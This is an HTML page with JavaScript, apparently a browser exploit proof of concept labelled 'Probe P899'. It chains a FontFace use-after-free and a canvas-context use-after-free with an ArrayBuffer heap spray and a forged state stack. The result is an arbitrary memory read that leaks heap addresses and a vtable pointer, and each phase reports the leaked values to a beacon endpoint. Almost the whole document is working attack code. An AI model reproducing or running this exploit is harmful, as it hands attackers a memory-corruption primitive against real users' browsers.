<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P899: Live Heap Forged StateStack Arbitrary Read & Vtable Leak</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P899...</div>
<h2>P899: Live Heap Forged StateStack Arbitrary Read & Vtable Leak</h2>
<pre id="log">Initializing diagnostic probe P899...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P899-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

var _convBuf = new ArrayBuffer(8);
var _convF64 = new Float64Array(_convBuf);
var _convU32 = new Uint32Array(_convBuf);

function f64toHex(val) {
  _convF64[0] = val;
  var lo = _convU32[0], hi = _convU32[1];
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P899 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: FontFace UAF (Disclose Live Heap H and q13)
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;

  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var q13_hi = 0, q13_lo = 0;

  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13_hi = q13hi;
      q13_lo = q13lo;
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
  }

  log('[+] Phase 1: Live Heap Leaked: H=' + Hstr + ' | q13=' + q13str + ' (Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|slot=' + bestI);

  if (q13_hi === 0) {
    log('[-] Fatal: q13 leak missed, halting to prevent unmapped dereference', 'fail');
    syncBn('DONE', 'status=failed_no_leak');
    return;
  }

  /* ============================================================
   * PHASE 2: Canvas UAF Trigger (Free 768B Context)
   * ============================================================ */
  var canvas = document.createElement('canvas');
  canvas.width = 1; canvas.height = 1;
  var innerCtx = null;
  var uafOpts = {};
  Object.defineProperty(uafOpts, 'alpha', {
    get: function() {
      innerCtx = canvas.getContext('2d');
      return true;
    }
  });
  canvas.getContext('bitmaprenderer', uafOpts);

  if (!innerCtx) {
    log('[-] Fatal: Canvas UAF failed to capture innerCtx', 'fail');
    syncBn('DONE', 'status=failed_no_inner');
    return;
  }
  log('[+] Phase 2: Canvas UAF Created Dangling innerCtx', 'ok');

  /* ============================================================
   * PHASE 3: Spray 200 ArrayBuffer(768) to Reclaim Freed Context
   * ============================================================ */
  var SPRAY = 200;
  var abs = new Array(SPRAY);
  var dvs = new Array(SPRAY);
  for (var s = 0; s < SPRAY; s++) {
    abs[s] = new ArrayBuffer(768);
    dvs[s] = new DataView(abs[s]);
  }
  log('[+] Phase 3: Sprayed 200 ArrayBuffer(768) Reclaimers', 'ok');

  /* ============================================================
   * PHASE 4: Forge m_stateStack to Read q13 (CSSFontSelector Vtable)
   * Target address within State = TARGET + 48 = q13
   * Therefore TARGET = q13 - 48
   * ============================================================ */
  var borrowTgt = (q13_lo < 48) ? 1 : 0;
  var tgt_lo = (q13_lo - 48) >>> 0;
  var tgt_hi = q13_hi - borrowTgt;
  var tgtHex = '0x' + tgt_hi.toString(16) + ('00000000' + tgt_lo.toString(16)).slice(-8);

  log('[*] Phase 4: Forging m_stateStack pointing to TARGET=' + tgtHex + ' (q13=' + q13str + ')', 'hot');

  // Inscribe forged m_stateStack in ALL sprayed ArrayBuffers
  for (var w = 0; w < SPRAY; w++) {
    var dv = dvs[w];
    // m_stateStack.m_buffer at offset +112 (8 bytes)
    dv.setUint32(112, tgt_lo, true);
    dv.setUint32(116, tgt_hi, true);
    // m_stateStack.m_capacity at offset +120
    dv.setUint32(120, 2, true);
    // m_stateStack.m_size at offset +124
    dv.setUint32(124, 1, true);
  }

  /* ============================================================
   * PHASE 5: Execute Arbitrary Read via lineWidth
   * ============================================================ */
  var rawVal = -1;
  var readOk = false;
  var leakedHex = 'unknown';

  try {
    // CRITICAL ARBITRARY READ
    rawVal = innerCtx.lineWidth;
    readOk = true;
    leakedHex = f64toHex(rawVal);
  } catch(e) {
    readOk = false;
    leakedHex = 'err:' + (e.message || '').slice(0, 40);
  }

  /* ============================================================
   * IMMEDIATE CLEANUP: Protect Heap & GC Safety
   * ============================================================ */
  innerCtx = null;
  for (var c = 0; c < SPRAY; c++) {
    dvs[c].setFloat64(112, 0, true);
    dvs[c].setUint32(120, 0, true);
    dvs[c].setUint32(124, 0, true);
  }

  log('[+] Phase 5: Arbitrary Read Executed: readOk=' + readOk, readOk ? 'ok' : 'fail');
  log('[***] LEAKED VALUE AT q13 (VTABLE): ' + leakedHex, 'hot');
  syncBn('VTABLE-LEAK', 'readOk=' + readOk + '|val=' + rawVal + '|hex=' + leakedHex + '|tgt=' + tgtHex);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P899 COMPLETE (' + leakedHex + ')';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P899 Completed Successfully', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Forged Target: ' + tgtHex, 'info');
  log('    - Arbitrary Read Result: ' + leakedHex, 'hot');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|readOk=' + readOk + '|leakedHex=' + leakedHex);

}, 600);
</script>
</body>
</html>
